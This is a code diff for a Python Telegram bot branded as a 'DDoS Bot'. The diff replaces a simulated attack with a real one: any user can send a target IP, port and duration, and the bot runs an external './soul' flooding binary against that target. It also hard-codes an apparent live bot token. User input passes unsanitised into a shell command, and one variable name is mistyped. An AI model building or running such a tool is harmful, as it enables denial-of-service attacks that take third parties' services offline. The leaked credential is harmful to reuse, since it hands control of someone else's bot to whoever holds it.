@@ -1,132 +1,142 @@
 import os
 import telebot
 import logging
-import time
 import asyncio
-from telebot.types import ReplyKeyboardMarkup, KeyboardButton
 from threading import Thread
+from telebot.types import ReplyKeyboardMarkup, KeyboardButton
 
-TOKEN = '7905527454:AAFU6FfZUXKYzShaiUAxAo1_ZNHGHTqzjww'  # Replace with your Telegram bot token
-CHANNEL_ID = -1002292224661  # Replace with your channel ID for sending attack messages
-FORWARD_CHANNEL_ID = -1002292224661  # Replace with your forward channel ID
+loop = asyncio.new_event_loop()
+
+TOKEN = "7905527454:AAFU6FfZUXKYzShaiUAxAo1_ZNHGHTqzjww"
+FORWARD_CHANNEL_ID = -1002292224661
 
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
 bot = telebot.TeleBot(TOKEN)
 REQUEST_INTERVAL = 1
+blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
 
-attack_in_progress = False
-remaining_attack_time = 0
+bot.attack_in_progress = False
+bot.attack_duration = 0
+bot.attack_start_time = 0
 
-# Create the send_message_with_retry function
-def send_message_with_retry(chat_id, text, reply_markup=None, parse_mode=None, retry_limit=5, delay=10):
-    """Function to handle rate limiting and retry logic."""
-    retries = 0
-    while retries < retry_limit:
-        try:
-            bot.send_message(chat_id, text, reply_markup=reply_markup, parse_mode=parse_mode)
-            break  # If the message is sent successfully, break out of the loop
-        except telebot.apihelper.ApiException as e:
-            if e.result_json.get("error_code") == 429:
-                # If rate limit is exceeded (Error 429), wait and try again
-                retry_after = e.result_json.get("parameters", {}).get("retry_after", 1)
-                time.sleep(retry_after)
-                retries += 1
-                logging.warning(f"Rate limit exceeded. Retrying after {retry_after}s...")
-            else:
-                logging.error(f"Failed to send message: {e}")
-                break
-        time.sleep(delay)  # Delay between retries
+# Define the main keyboard with buttons
+main_keyboard = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
+attack_button = KeyboardButton('/attack')
+when_button = KeyboardButton('/when')
+main_keyboard.add(attack_button, when_button)
 
-# Start function for the bot
 @bot.message_handler(commands=['start'])
-def send_welcome(message):
+def handle_start(message):
     user_id = message.from_user.id
-    chat_id = message.chat.id
+    username = message.from_user.username if message.from_user.username else "Not set"
+    first_name = message.from_user.first_name if message.from_user.first_name else "Not set"
+    last_name = message.from_user.last_name if message.from_user.last_name else ""
+
+    full_name = f"{first_name} {last_name}".strip()
+    status = "Approved"  # Automatically approve all users
+
+    profile_photos = bot.get_user_profile_photos(user_id)
+    if profile_photos.total_count > 0:
+        profile_photo = profile_phos.photos[0][-1].file_id
+    else:
+        profile_photo = None
+
+    welcome_message = f"""
+    Welcome to samy784 DDoS Bot!
+    Join @samy784
+
+    Your Information:
+    Name: {full_name}
+    Username: @{username}
+    ID Number: {user_id}
+    Status: {status}
     
-    # Create a markup object for custom keyboard
-    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
+    Commands:
+    Press the buttons below to interact with the bot.
+    """
 
-    # Create buttons
-    btn1 = KeyboardButton("Instant Plan 🧡")
-    btn2 = KeyboardButton("Vip Plan 💥")
-    btn3 = KeyboardButton("Canary Download✔️")
-    btn4 = KeyboardButton("My Account🏦")
-    btn5 = KeyboardButton("Help❓")
-    btn6 = KeyboardButton("Contact admin✔️")
+    if profile_photo:
+        bot.send_photo(message.chat.id, profile_photo, caption=welcome_message, reply_markup=main_keyboard)
+    else:
+        bot.reply_to(message, welcome_message, reply_markup=main_keyboard)
 
-    # Add buttons to the markup
-    markup.add(btn2)
 
-    # Send message with buttons
-    send_message_with_retry(message.chat.id, "*Choose an option:*", reply_markup=markup, parse_mode='Markdown')
+@bot.message_handler(func=lambda message: message.text == '/attack')
+def handle_attack_button(message):
+    if bot.attack_in_progress:
+        bot.send_message(message.chat.id, "⚠️ Please wait! The bot is currently busy with another attack.")
+        return
 
-# Function to handle Instant++ Plan button press
-@bot.message_handler(func=lambda message: message.text == "Vip Plan 💥")
-def handle_instant_plus_plan(message):
-    # Prompt user for target IP, port, and duration
-    bot.send_message(message.chat.id, "*Please provide the target IP, port, and duration (in seconds) separated by spaces.*", parse_mode='Markdown')
+    bot.send_message(message.chat.id, "💣 Ready to launch an attack?\n"
+                                      "Send the target IP, port, and duration in seconds.\n"
+                                      "Example: `167.67.25 6296 120` 🔥", parse_mode='Markdown')
     bot.register_next_step_handler(message, process_attack_command)
 
-# Function to process attack command and execute the attack
+
+@bot.message_handler(func=lambda message: message.text == '/when')
+def handle_when_button(message):
+    if not bot.attack_in_progress:
+        bot.send_message(message.chat.id, "There is no active attack right now.")
+    else:
+        elapsed_time = loop.time() - bot.attack_start_time
+        remaining_time = max(0, bot.attack_duration - elapsed_time)
+        bot.send_message(message.chat.id, f"Time remaining for the current attack: {int(remaining_time)} seconds.")
+
+
 def process_attack_command(message):
-    global attack_in_progress
     try:
         args = message.text.split()
         if len(args) != 3:
-            bot.send_message(message.chat.id, "*Invalid command format. Please use: target_ip target_port duration*", parse_mode='Markdown')
+            bot.send_message(message.chat.id, "❗ Error! Please provide the IP, port, and duration correctly.", parse_mode='Markdown')
             return
-        
+
         target_ip, target_port, duration = args[0], int(args[1]), int(args[2])
 
-        # Limit attack duration to 120 seconds
+        if target_port in blocked_ports:
+            bot.send_message(message.chat.id, f"🔒 Port {target_port} is blocked.", parse_mode='Markdown')
+            return
         if duration > 120:
-            duration = 120
-            bot.send_message(message.chat.id, "*Attack duration has been limited to 120 seconds.*", parse_mode='Markdown')
-
-        # Check if an attack is already in progress
-        if attack_in_progress:
-            bot.send_message(message.chat.id, "*An attack is already in progress. Please wait until it finishes before initiating another one.*", parse_mode='Markdown')
+            bot.send_message(message.chat.id, "⏳ Maximum duration is 120 seconds.", parse_mode='Markdown')
             return
 
-        # Start the attack
-        attack_in_progress = True
-        bot.send_message(message.chat.id, f"Attack started on Host: {target_ip}, Port: {target_port}, Duration: {duration} seconds.")
+        bot.attack_in_progress = True
+        bot.attack_duration = duration
+        bot.attack_start_time = loop.time()
 
-        # Simulate attack running (this can be replaced with actual attack code)
-        asyncio.run(run_attack_simulation(target_ip, target_port, duration))
-
-        # Notify that attack is complete
-        bot.send_message(message.chat.id, "*Attack has finished! You can initiate another attack now.*", parse_mode='Markdown')
-
+        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
+        bot.send_message(message.chat.id, f"🚀 Attack Launched!\n"
+                                          f"Target Host: {target_ip}\n"
+                                          f"Target Port: {target_port}\n"
+                                          f"Duration: {duration} seconds!", parse_mode='Markdown')
     except Exception as e:
-        logging.error(f"Error in processing attack command: {e}")
-        bot.send_message(message.chat.id, "*There was an error processing your request. Please try again.*", parse_mode='Markdown')
+        logging.error(f"Error processing attack command: {e}")
+        bot.attack_in_progress = False
 
-# Simulate an attack process (this is where you would run the actual attack logic)
-async def run_attack_simulation(target_ip, target_port, duration):
-    await asyncio.sleep(duration)
-    attack_in_progress = False
-    logging.info(f"Attack on Host: {target_ip}, Port: {target_port}, Duration: {duration} seconds has completed.")
 
-# Start the bot's asyncio loop
-async def start_asyncio_loop():
-    while True:
-        await asyncio.sleep(REQUEST_INTERVAL)
+async def run_attack_command_async(target_ip, target_port, duration):
+    try:
+        process = await asyncio.create_subprocess_shell(
+            f"./soul {target_ip} {target_port} {duration} 900",
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE,
+        )
 
-# Start the bot polling and handle async tasks
-if __name__ == "__main__":
-    # Ensure that the bot polling is run within asyncio
-    loop = asyncio.get_event_loop()
-    loop.create_task(bot.polling(none_stop=True))  # Run bot polling in the background
-    loop.run_forever()  # Keep the event loop running
-    logging.info("Starting Telegram bot...")
-    
-    # Run the event loop
-    while True:
-        try:
-            loop.run_until_complete(start_asyncio_loop())  # Keep async loop running
-        except Exception as e:
-            logging.error(f"An error occurred while polling: {e}")
-        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
-        time.sleep(REQUEST_INTERVAL)
+        stdout, stderr = await process.communicate()
+        logging.info(f"Attack Output: {stdout.decode()}")
+        if stderr:
+            logging.error(f"Attack Error: {stderr.decode()}")
+    except Exception as e:
+        logging.error(f"Error during attack execution: {e}")
+    finally:
+        bot.attack_in_progress = False
+
+
+def start_asyncio_thread():
+    asyncio.set_event_loop(loop)
+    loop.run_forever()
+
+
+if __name__ == '__main__':
+    Thread(target=start_asyncio_thread).start()
+    bot.infinity_polling()
